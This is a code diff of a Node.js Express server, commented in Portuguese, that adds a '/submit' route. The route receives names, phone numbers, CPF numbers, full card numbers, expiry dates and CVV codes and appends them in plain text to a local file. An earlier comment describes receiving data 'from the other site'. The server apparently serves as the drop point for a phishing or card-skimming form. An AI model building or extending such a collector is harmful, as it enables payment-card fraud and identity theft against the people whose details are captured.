@@ -6,22 +6,28 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Middleware para lidar com os dados JSON
+// Middleware para lidar com dados do formulário
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
 
-// Rota para receber os dados do outro site
-app.post('/receber-dados', (req, res) => {
-  const dados = req.body;
-  const dataString = JSON.stringify(dados, null, 2) + '\n';
+// Rota básica para evitar o erro "Cannot GET /"
+app.get('/', (req, res) => {
+  res.status(200).send('Servidor de recepção de dados está ativo.');
+});
 
-  // Salvar os dados recebidos em um arquivo .txt
-  fs.appendFile(path.join(__dirname, 'dados.txt'), dataString, (err) => {
+// Rota para receber os dados do formulário
+app.post('/submit', (req, res) => {
+  const { nome, telefone, cpf, nomeTitular, numeroCartao, dataValidade, cvv } = req.body;
+  const data = `Nome: ${nome}, Telefone: ${telefone}, CPF: ${cpf}, Nome do Titular: ${nomeTitular}, Número do Cartão: ${numeroCartao}, Data de Validade: ${dataValidade}, CVV: ${cvv}\n`;
+
+  // Salvar os dados em um arquivo txt
+  fs.appendFile('dados.txt', data, (err) => {
     if (err) {
       console.error('Erro ao salvar os dados:', err);
-      return res.status(500).send('Erro ao salvar os dados.');
+      res.status(500).send('Erro ao salvar os dados.');
+    } else {
+      res.status(200).send('Dados recebidos e salvos com sucesso.');
     }
-    res.send('Dados recebidos e salvos com sucesso!');
   });
 });
 
